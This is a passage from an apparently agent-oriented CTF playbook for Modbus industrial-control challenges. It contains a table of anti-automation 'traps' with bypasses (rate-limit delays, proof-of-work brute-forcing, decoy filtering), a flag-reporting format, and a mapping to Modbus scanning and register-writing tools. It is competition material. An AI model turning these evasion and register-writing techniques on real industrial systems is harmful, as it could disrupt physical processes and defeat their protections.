│  ├── Detection: FAKE, DECOY, NOT_FLAG in data                  │
│  ├── Bypass: Filter with regex, verify checksum                │
│  └── Command: --filter-decoys                                   │
│                                                                 │
│  TRAP: Rate Limit                                               │
│  ├── Detection: Connection reset after N requests               │
│  ├── Bypass: Add 200ms delay between requests                  │
│  └── Command: --delay 0.2                                       │
│                                                                 │
│  TRAP: PoW Block                                                │
│  ├── Detection: Hash challenge before access                    │
│  ├── Bypass: Auto-solve with brute-force                       │
│  └── Command: --solve-pow                                       │
│                                                                 │
│  TRAP: Float Precision                                          │
│  ├── Detection: Calculation mismatch                            │
│  ├── Bypass: Use decimal.Decimal                               │
│  └── Command: --high-precision                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🎯 Victory Protocol

เมื่อพบ flag ให้รายงานในรูปแบบนี้:

```
[FLAG] <raw_flag>
[CLEAN] <sanitized_flag>
[METHOD] <1-line extraction command or decode chain>
```

ตัวอย่าง:
```
[FLAG] coc2026{4n71_41_7r4p_byp4ss3d}
[CLEAN] coc2026{4n71_41_7r4p_byp4ss3d}
[METHOD] python3 universal_bypass.py --ip 172.20.0.20 --port 502 --auto
```

---

## 📚 Reference: ctf-ics Skill Integration

Playbook นี้ออกแบบมาให้ทำงานร่วมกับ skill `ctf-ics`:

| Playbook Function | ctf-ics Tool |
|-------------------|---------------|
| Trap Detection | `modbus_connect_test.py --full-scan` |
| Unit ID Discovery | `modbus_unit_map.py --probe-units` |
| Safe Register Scan | `modbus_read_find_flags.py --start-addr 50` |
| State Machine Crack | `modbus_write_find_flags.py` |
| Challenge-Response | `modbus_stateful_decoder.py` |
| Evidence Collection | `--json` flag on all tools |

---

> **Remember:** AI สร้าง trap จาก pattern ที่คาดเดาได้  
> ถ้าเข้าใจว่า AI คิดยังไง เราก็ทะลุได้ทุก trap 🎯
